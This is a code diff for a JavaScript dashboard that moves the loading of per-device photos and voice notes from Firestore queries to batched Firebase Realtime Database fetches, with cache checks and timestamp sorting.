@@ -759,25 +759,30 @@ function renderPhotosFromCache() {
   }).filter(Boolean).join('') || '<div class="label">No photos yet</div>';
 }
 
-async function loadPhotosFromFirestore() {
+async function loadPhotos() {
   if (!selectedDevice) return;
-  const resp = await fetchFirestore(`devices/${selectedDevice}/photos?orderBy=timestamp%20desc&pageSize=200`);
-  if (!resp || !resp.documents) return;
-  for (const doc of resp.documents) {
-    const id = doc.name.split('/').pop();
-    if (cachedPhotos[id]) continue;
-    const data = fromFirestoreFields(doc.fields);
-    if (data && data.data && data.data.startsWith('/9j/')) cachedPhotos[id] = data;
+  const keys = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
+  if (!keys || typeof keys !== 'object') return;
+  const allTs = Object.keys(keys).sort((a, b) => (parseInt(b)||0) - (parseInt(a)||0));
+  const uncached = allTs.filter(k => !cachedPhotos[k]);
+  for (let i = 0; i < uncached.length; i += 8) {
+    await Promise.all(uncached.slice(i, i + 8).map(async ts => {
+      if (cachedPhotos[ts]) return;
+      try {
+        const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
+        if (doc && doc.data && doc.data.startsWith('/9j/')) cachedPhotos[ts] = doc;
+      } catch {}
+    }));
   }
 }
 
 async function pollPhotos() {
-  await loadPhotosFromFirestore();
+  await loadPhotos();
   renderPhotosFromCache();
 }
 
 async function preloadPhotos() {
-  await loadPhotosFromFirestore();
+  await loadPhotos();
   renderPhotosFromCache();
 }
 
@@ -931,14 +936,12 @@ async function pollHistory() {
 async function pollVoiceNotes() {
   if (!selectedDevice) return;
   const list = document.getElementById('voiceNotesList');
-  const resp = await fetchFirestore(`devices/${selectedDevice}/voice`);
-  if (!resp || !resp.documents) {
+  let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
+  if (!data || typeof data !== 'object') {
     list.innerHTML = '<div class="label">No voice notes yet</div>';
     return;
   }
-  const batches = resp.documents
-    .map(d => fromFirestoreFields(d.fields))
-    .sort((a, b) => (parseInt(b.ts_ms)||0) - (parseInt(a.ts_ms)||0));
+  const batches = Object.values(data).sort((a, b) => (parseInt(b.ts_ms)||0) - (parseInt(a.ts_ms)||0));
   let html = '';
   for (const batch of batches) {
     const notes = batch.notes || [];
